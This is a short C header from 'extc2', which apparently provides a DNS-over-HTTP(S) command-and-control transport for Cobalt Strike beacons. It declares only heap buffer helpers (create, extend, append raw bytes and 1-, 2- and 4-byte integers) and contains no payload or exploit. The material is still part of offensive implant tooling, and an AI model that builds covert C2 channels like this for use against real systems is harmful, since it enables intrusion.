/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

/*-
 *
 * BufferCreate
 *
 * Purpose:
 *
 * Allocates a buffer on the heap
 *
-*/
DEFINESEC(B) PVOID BufferCreate( PBEACON_INSTANCE Ins, ULONG Length );

/*-
 *
 * BufferExtend
 *
 * Purpose:
 *
 * Extends a buffer on the heap
 *
-*/
DEFINESEC(B) PVOID BufferExtend( PBEACON_INSTANCE Ins, PVOID Buffer, ULONG Length );

/*-
 *
 * BufferAddRaw
 *
 * Purpose:
 *
 * Appends a value of the specified length
 * onto a buffer.
 *
-*/
DEFINESEC(B) PVOID BufferAddRaw( PBEACON_INSTANCE Ins, PVOID Buffer, PVOID Value, ULONG Length );

/*-
 *
 * BufferAddUI1
 *
 * Purpose:
 *
 * Appends a 1-byte int onto a buffer
 *
-*/
DEFINESEC(B) PVOID BufferAddUI1( PBEACON_INSTANCE Ins, PVOID Buffer, BYTE Value );

/*-
 *
 * BufferAddUI2
 *
 * Purpose:
 *
 * Appends a 2-byte int onto a buffer
 *
-*/
DEFINESEC(B) PVOID BufferAddUI2( PBEACON_INSTANCE Ins, PVOID Buffer, USHORT Value );

/*-
 *
 * BufferAddUI4
 *
 * Purpose:
 *
 * Appends a 4-byte int onto a buffer
 *
-*/
DEFINESEC(B) PVOID BufferAddUI4( PBEACON_INSTANCE Ins, PVOID Buffer, ULONG Value );
